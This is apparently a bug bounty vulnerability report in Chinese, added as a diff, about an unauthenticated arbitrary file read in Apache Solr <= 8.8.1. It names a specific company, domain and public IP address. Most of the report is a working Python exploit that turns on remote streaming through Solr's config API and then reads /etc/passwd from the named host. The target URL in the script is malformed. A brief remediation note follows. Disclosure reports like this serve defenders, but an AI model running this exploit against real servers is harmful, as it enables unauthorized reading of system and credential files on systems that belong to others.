@@ -1,0 +1,41 @@
+厂商名称：商中在线科技股份有限公司
+所属SRC：互联网空间-亿万守护计划
+漏洞标题：xxx网站存在敏感文件泄露
+漏洞类别：web
+漏洞类型: 事件型
+利用通用漏洞：是
+组件名称：Apache Solr <= 8.8.1任意文件读取漏洞
+漏洞等级：高危
+漏洞url：http://chinadns.com:8983 http://www.chinadns.com:8983
+网站名称：商中在线科技股份有限公司
+网站ip：58.215.75.233
+所属地区：厦门市思明区高雄路18号通达国际中心501、502单元
+漏洞描述：Apache Solr存在任意文件读取,漏洞攻击者可以在未授权的情况下获取目标服务器敏感文件
+公司业务：软件开发；互联网信息服务（不含药品信息服务和网吧）；互联网域名注册服务；数据处理和存储服务；其他未列明信息技术服务业（不含需经许可审批的项目）；互联网接入及相关服务（不含网吧）；其他互联网服务（不含需经许可审批的项目）；经营各类商品和技术的进出口（不另附进出口商品目录），但国家限定公司经营或禁止进出口的商品及技术除外；信息技术咨询服务；计算机、软件及辅助设备零售；广告的设计、制作、代理、发布；会议及展览服务。
+复现步骤：
+# -*- coding: utf-8 -*-
+import requests
+
+host = "http://http://58.215.75.233:8983"
+if host[-1] == '/':
+    host = host[:-1]
+
+
+def poc(host):
+    url = host + '/solr/admin/cores?indexInfo=false&wt=json'
+    core_data = requests.get(url, timeout=3).json()
+    if core_data['status']:
+        core = list(core_data['status'].keys())[0]
+        jsonp_data = {"set-property": {"requestDispatcher.requestParsers.enableRemoteStreaming": 'true'}}
+        requests.post(url=host + "/solr/%s/config" % core, json=jsonp_data)
+
+        result_data = requests.post(url=host + '/solr/%s/debug/dump?param=ContentStreams' % core,
+                                    data={"stream.url": "file:///etc/passwd"}).json()
+        if result_data['streams']:
+            print(result_data['streams'][0]['stream'])
+    else:
+        exit("不存在此漏洞")
+
+
+poc(host)
+修复方案：由于官方拒绝修复该漏洞，因此请将Apache solr在内网中启动，若需要在公网中使用，需要限制访问ip 
